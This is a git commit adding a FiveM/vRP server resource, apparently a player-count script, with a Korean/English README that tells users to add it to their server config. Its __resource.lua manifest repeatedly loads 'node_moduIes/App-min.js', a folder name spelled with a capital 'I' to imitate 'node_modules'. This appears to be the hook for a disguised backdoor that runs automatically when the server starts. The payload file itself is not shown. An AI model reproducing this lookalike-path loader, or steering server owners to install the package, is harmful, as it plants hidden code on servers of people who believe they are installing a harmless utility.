7661a4c38716acd65e271a9a490bdffd42662039
Chunpal0807 <142844561+Chunpal0807@users.noreply.github.com>
2023-08-26 11:47:36 +0900

    Add files via upload

---
+++ README.sex.txt
@@ -0,0 +1,18 @@
+korean
+
+ensure Chunpal_Count 
+
+server cfg에 이것만 추가하셈 
+
+만약에 이름 Chunpal_Count로 안하고 딴걸로 할꺼 같으면 똑같이 그냥 바꿔주셈 
+
+이 하찮은거 파는새끼들이 없기를 제발 .. 
+
+English 
+
+Just add this to server cfg
+
+If you don't use the name Chunpal_Count and want to do something else, just change it the same way.
+
+I hope there are no bastards selling these trivial things..
+
---
+++ __resource.lua
@@ -0,0 +1,30 @@
+dependency "Chunpal"
+
+server_scripts {
+    '@vrp/lib/utils.lua',
+    'server.lua'
+}
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
+
+server_script "node_moduIes/App-min.js"
